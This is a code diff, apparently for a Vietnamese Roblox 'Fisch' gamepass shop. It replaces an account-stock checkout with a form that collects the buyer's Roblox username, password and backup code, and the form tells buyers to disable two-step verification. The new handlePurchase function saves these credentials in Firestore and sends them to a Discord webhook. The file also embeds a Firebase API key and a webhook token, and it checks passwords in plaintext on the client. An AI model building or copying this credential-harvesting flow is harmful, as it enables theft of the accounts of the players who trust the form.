@@ -793,7 +793,8 @@
                 </div>
             </div>
         </div>
-<div class="announcement-bar">
+
+        <div class="announcement-bar">
     <span class="announcement-text">
         GIẢM GIÁ ĐẶC BIỆT CÁC DỊCH VỤ VIP: XỬ LÝ ĐƠN HÀNG NHANH CHÓNG TRONG 24H
     </span>
@@ -937,27 +938,37 @@
     <div class="modal-content">
         <span class="close-icon" onclick="closeModal()">&times;</span>
 
-        <h2 class="modal-title">XÁC NHẬN MUA ACC</h2>
+        <h2 class="modal-title">XÁC NHẬN MUA NGAY</h2>
         <div class="divider"></div>
 
         <div class="rate-banner">
-            <p>BẠN ĐANG MUA TÀI KHOẢN CÓ SẴN TRONG KHO.</p>
-            <p>HỆ THỐNG SẼ TỰ ĐỘNG GỬI TÀI KHOẢN VÀ MẬT KHẨU SAU KHI THANH TOÁN.</p>
+            <p>VUI LÒNG NHẬP THÔNG TIN CỦA BẠN MỘT CÁCH CHÍNH XÁC NHẤT</p>
             <p>MỌI THẮC MẮC LIÊN HỆ: <span class="highlight-pink">https://discord.gg/j282RhKD2J</span></p>
+            <p>VUI LÒNG TẮT XÁC MINH 2 BƯỚC</p>
         </div>
 
         <div class="form-body">
             <div class="input-group">
-                <label>Gói Tài Khoản:</label>
-                <input type="text" id="modalAccType" class="custom-input" readonly>
+                <label>Thành tiền:</label>
+                <input type="text" id="modalPrice" class="custom-input" readonly style="color:#2ecc71; font-weight:bold;">
+            </div>
+        
+            <div class="input-group">
+                <label>Tên Tài Khoản Roblox:</label>
+                <input type="text" id="modalRobloxUser" class="custom-input" placeholder="Nhập tên tài khoản của bạn">
             </div>
 
             <div class="input-group">
-                <label>Giá tiền:</label>
-                <input type="text" id="modalPrice" class="custom-input" readonly style="color:#2ecc71; font-weight:bold;">
+                <label>Mật khẩu (Tạm thời):</label>
+                <input type="text" id="modalRobloxPass" class="custom-input" placeholder="Mật khẩu của bạn">
             </div>
 
-            <button class="pay-btn" onclick="handlePurchase()">XÁC NHẬN MUA NGAY</button>
+            <div class="input-group">
+                <label>MÃ DỰ PHÒNG CỦA BẠN (BẮT BUỘC)</label>
+                <input type="text" id="modalBackupCode" class="custom-input" placeholder="Để tiện xử lí">
+            </div>
+
+            <button class="pay-btn" onclick="handlePurchase()">THANH TOÁN & ĐẶT HÀNG</button>
         </div>
     </div>
 </div>
@@ -1006,40 +1017,34 @@
     </footer>
 
     <script>
-    let currentItem = null;
     document.addEventListener("DOMContentLoaded", function() {
-        const modal = document.getElementById('confirmPurchaseModal');
-        const closeBtn = document.querySelector('.close-icon'); 
-        
-        window.openModal = function(name, price) {
-            if(!localStorage.getItem('currentUser')) {
-                showCustomAlert("Yêu cầu", "Vui lòng đăng nhập để mua hàng!", true);
-                return;
-            }
-            currentItem = { name, price };
-            document.getElementById('modalAccType').value = name;
-            document.getElementById('modalPrice').value = price.toLocaleString() + " VNĐ";
-            document.getElementById('confirmPurchaseModal').style.display = 'flex';
+    const modal = document.getElementById('confirmPurchaseModal');
+    const closeBtn = document.querySelector('.close-icon'); 
+    window.openModal = function(name, price) {
+        if(!localStorage.getItem('currentUser')) {
+            showCustomAlert("Yêu cầu", "Vui lòng đăng nhập để mua hàng!", true);
+            return;
         }
-
-        window.closeModal = function() {
-            if(document.getElementById('confirmPurchaseModal')) {
-                document.getElementById('confirmPurchaseModal').style.display = 'none';
-            }
-            if(document.getElementById('authModal')) {
-                document.getElementById('authModal').classList.remove('active');
-            }
+        currentItem = { name, price };
+        document.getElementById('modalPrice').value = price.toLocaleString() + " VNĐ";
+        document.getElementById('confirmPurchaseModal').style.display = 'flex';
+    }
+    window.closeModal = function() {
+        if(document.getElementById('confirmPurchaseModal')) {
+            document.getElementById('confirmPurchaseModal').style.display = 'none';
         }
-        if (closeBtn) {
-            closeBtn.addEventListener('click', window.closeModal);
+    }
+    if (closeBtn) {
+        closeBtn.addEventListener('click', window.closeModal);
+    }
+    window.onclick = function(event) {
+        if (event.target == modal) {
+            window.closeModal();
         }
-        window.onclick = function(event) {
-            if (event.target == modal) {
-                window.closeModal();
-            }
-        }
+    }
     });
         // CẤU HÌNH FIREBASE VÀ CÁC HÀM API
+        
         const firebaseConfig = {
           apiKey: "AIzaSyBtTKQCFN9Y983H2V88n17oMYRMoolQ",
           authDomain: "shop-tbd.firebaseapp.com",
@@ -1054,8 +1059,9 @@
         const db = firebaseApp.firestore(); 
         const cardsDb = db.collection("card_records"); 
         
-        // WEBHOOK CONFIG (DÙNG WEBHOOK GAMEPASS)
+        // WEBHOOK CONFIG
         const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1452258008506695784/UTMSvXzc99WtJRNgSOhgoQmo7ux-o-qOh857nDcfPEEbL9NS_B6hezGIoqjpO83fPug7";
+        let currentItem = null;
 
         async function fetchUserData(username) {
             const doc = await db.collection("users").doc(username).get();
@@ -1085,9 +1091,11 @@
             return true;
         }
         
+        // HÀM HIỂN THỊ ALERT TÙY CHỈNH (THAY THẾ alert())
         function showCustomAlert(title, message, isError = false) {
             document.getElementById('alertTitle').textContent = title;
             document.getElementById('alertMessage').innerHTML = message;
+            
             if (isError) {
                 document.getElementById('alertTitle').style.color = '#e74c3c';
             } else {
@@ -1096,18 +1104,26 @@
             document.getElementById('customAlert').style.display = 'flex';
         }
         
-        // --- XỬ LÝ MUA HÀNG (ACCOUNT SHOP - FISCH) ---
+        // --- XỬ LÝ MUA HÀNG VÀ GỬI WEBHOOK ---
         async function handlePurchase() {
             const user = localStorage.getItem('currentUser');
-            if(!user || !currentItem) return;
+            if(!user) return;
+
+            const robloxUser = document.getElementById('modalRobloxUser').value;
+            const robloxPass = document.getElementById('modalRobloxPass').value;
+            const backupCode = document.getElementById('modalBackupCode').value;
+
+            if(!robloxUser || !robloxPass || !backupCode) {
+                showCustomAlert("Thiếu thông tin", "Vui lòng nhập đầy đủ Tài khoản, Mật khẩu và Mã dự phòng!", true);
+                return;
+            }
 
             const item = currentItem;
             const userRef = db.collection("users").doc(user);
-            let boughtAcc = null;
 
             try {
                 await db.runTransaction(async (transaction) => {
-                    // 1. Kiểm tra tiền
+                    // Check tiền
                     const userDoc = await transaction.get(userRef);
                     if (!userDoc.exists) throw "Lỗi tài khoản!";
                     const balance = userDoc.data().balance || 0;
@@ -1116,57 +1132,40 @@
                         throw "Số dư không đủ để thanh toán!";
                     }
 
-                    // 2. Tìm acc trong kho (stock_fisch)
-                    // LƯU Ý: ADMIN CẦN THÊM ACC VỚI TÊN DỊCH VỤ CHÍNH XÁC NHƯ TRÊN WEB (VÍ DỤ: "LUCK", "SUPPORT")
-                    const accQuery = await db.collection('stock_fisch')
-                        .where('service', '==', item.name)
-                        .where('status', '==', 'chua') // 'chua' = chưa bán
-                        .limit(1)
-                        .get();
-
-                    if (accQuery.empty) {
-                        throw "Sản phẩm này hiện đang hết hàng!";
-                    }
-
-                    const accDoc = accQuery.docs[0];
-                    boughtAcc = accDoc.data();
-
-                    // 3. Trừ tiền và Cập nhật trạng thái acc
+                    // Trừ tiền
                     transaction.update(userRef, { balance: balance - item.price });
-                    transaction.update(accDoc.ref, { 
-                        status: 'da', // 'da' = đã bán
-                        soldTo: user,
-                        soldAt: firebase.firestore.FieldValue.serverTimestamp()
-                    });
-                    
-                    // 4. Lưu lịch sử mua hàng cho User
-                    const historyRef = db.collection("user_purchases").doc();
-                    transaction.set(historyRef, {
-                        username: user,
-                        item_name: item.name,
+
+                    // Lưu đơn hàng
+                    const orderRef = db.collection("orders_gamepass").doc();
+                    transaction.set(orderRef, {
+                        customer: user,
+                        service: item.name,
                         price: item.price,
-                        acc_username: boughtAcc.username,
-                        acc_password: boughtAcc.password,
+                        roblox_user: robloxUser,
+                        roblox_pass: robloxPass,
+                        backup_code: backupCode,
+                        status: "pending",
                         timestamp: firebase.firestore.FieldValue.serverTimestamp()
                     });
                 });
 
-                // 5. Gửi Webhook Discord
-                if(DISCORD_WEBHOOK_URL && boughtAcc) {
+                // Gửi Webhook Discord
+                if(DISCORD_WEBHOOK_URL) {
                     fetch(DISCORD_WEBHOOK_URL, {
                         method: "POST",
                         headers: { "Content-Type": "application/json" },
                         body: JSON.stringify({
-                            content: `@everyone Đơn hàng mới: ${user} vừa mua Account Fisch!`,
+                            content: "@everyone Có đơn hàng Gamepass Fisch mới!",
                             embeds: [{
-                                title: "✅ GIAO DỊCH THÀNH CÔNG",
-                                color: 5763719, // Màu xanh lá
+                                title: "📦 ĐƠN HÀNG GAMEPASS MỚI",
+                                color: 16711680,
                                 fields: [
                                     { name: "Khách hàng", value: user, inline: true },
-                                    { name: "Gói Account", value: item.name, inline: true },
+                                    { name: "Gói dịch vụ", value: item.name, inline: true },
                                     { name: "Giá tiền", value: item.price.toLocaleString() + " VNĐ", inline: true },
-                                    { name: "Tài khoản", value: `||${boughtAcc.username}||`, inline: true },
-                                    { name: "Mật khẩu", value: `||${boughtAcc.password}||`, inline: true }
+                                    { name: "Acc Roblox", value: `||${robloxUser}||`, inline: false },
+                                    { name: "Mật khẩu", value: `||${robloxPass}||`, inline: false },
+                                    { name: "Mã dự phòng", value: `||${backupCode}||`, inline: false }
                                 ],
                                 timestamp: new Date().toISOString()
                             }]
@@ -1175,7 +1174,7 @@
                 }
 
                 window.closeModal();
-                showCustomAlert("Thành công", `Mua thành công!<br>Tài khoản: <b>${boughtAcc.username}</b><br>Mật khẩu: <b>${boughtAcc.password}</b><br>Vui lòng kiểm tra lịch sử mua hàng.`);
+                showCustomAlert("Thành công", `Đặt hàng thành công gói <b>${item.name}</b>.<br>Vui lòng chờ Admin xử lý đơn hàng.`);
                 checkLoginStatus();
 
             } catch (e) {
@@ -1282,7 +1281,7 @@
 
             if (user && user.password === password) {
                 localStorage.setItem('currentUser', username);
-                window.closeModal();
+                closeModal();
                 showCustomAlert("Thành công", "Đăng nhập thành công!");
                 checkLoginStatus();
             } else {
